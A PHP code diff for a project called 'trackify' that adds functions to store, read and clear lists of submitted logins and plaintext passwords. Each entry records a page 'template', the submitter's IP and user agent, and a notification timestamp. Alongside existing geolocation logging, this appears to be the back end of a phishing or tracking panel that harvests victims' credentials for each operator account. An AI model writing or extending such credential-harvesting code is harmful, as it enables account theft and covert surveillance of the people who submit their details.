@@ -158,3 +158,116 @@ function trackify_append_geolocation(int $userId, array $entry): void
     $data[] = $entry;
     file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));
 }
+
+function trackify_user_saved_info_dir(int $userId): string
+{
+    $dir = trackify_project_root() . '/data/saved_info/u' . $userId;
+    if (!is_dir($dir)) {
+        @mkdir($dir, 0755, true);
+    }
+
+    return $dir;
+}
+
+function trackify_max_saved_logins(): int
+{
+    return 500;
+}
+
+/**
+ * @return array<int, array{at:string, login:string, password:string, template:string, ip:string, user_agent:string}>
+ */
+function trackify_read_saved_logins(int $userId): array
+{
+    $file = trackify_user_saved_info_dir($userId) . '/logins.json';
+    if (!is_readable($file)) {
+        return [];
+    }
+    $raw = file_get_contents($file);
+    if ($raw === false || $raw === '') {
+        return [];
+    }
+    $list = json_decode($raw, true);
+    if (!is_array($list)) {
+        return [];
+    }
+
+    return array_reverse($list);
+}
+
+/**
+ * @return bool true when stored
+ */
+function trackify_append_saved_login(int $userId, string $login, string $password, string $template, string $clientIp, string $userAgent): bool
+{
+    $trunc = static function (string $s, int $max): string {
+        if (function_exists('mb_substr')) {
+            return mb_substr($s, 0, $max, 'UTF-8');
+        }
+
+        return strlen($s) <= $max ? $s : substr($s, 0, $max);
+    };
+    $login = $trunc($login, 512);
+    $password = $trunc($password, 512);
+    $template = preg_replace('/[^a-z0-9._-]/i', '', $trunc($template, 48)) ?? '';
+    if ($template === '') {
+        $template = 'unknown';
+    }
+    $userAgent = $trunc($userAgent, 400);
+
+    $dir = trackify_user_saved_info_dir($userId);
+    $file = $dir . '/logins.json';
+    $fp = @fopen($file, 'c+');
+    if ($fp === false) {
+        return false;
+    }
+    if (!flock($fp, LOCK_EX)) {
+        fclose($fp);
+
+        return false;
+    }
+    $raw = stream_get_contents($fp);
+    $list = [];
+    if (is_string($raw) && $raw !== '') {
+        $decoded = json_decode($raw, true);
+        if (is_array($decoded)) {
+            $list = $decoded;
+        }
+    }
+    $list[] = [
+        'at' => gmdate('c'),
+        'login' => $login,
+        'password' => $password,
+        'template' => $template,
+        'ip' => $clientIp,
+        'user_agent' => $userAgent,
+    ];
+    $max = trackify_max_saved_logins();
+    if (count($list) > $max) {
+        $list = array_slice($list, -$max);
+    }
+    rewind($fp);
+    ftruncate($fp, 0);
+    fwrite($fp, json_encode($list, JSON_UNESCAPED_UNICODE));
+    fflush($fp);
+    flock($fp, LOCK_UN);
+    fclose($fp);
+
+    @file_put_contents($dir . '/login_notify.txt', gmdate('c') . "\n", FILE_APPEND | LOCK_EX);
+
+    return true;
+}
+
+function trackify_clear_saved_logins(int $userId): bool
+{
+    $dir = trackify_user_saved_info_dir($userId);
+    $ok = true;
+    foreach (['/logins.json', '/login_notify.txt'] as $suffix) {
+        $p = $dir . $suffix;
+        if (is_file($p) && !@unlink($p)) {
+            $ok = false;
+        }
+    }
+
+    return $ok;
+}
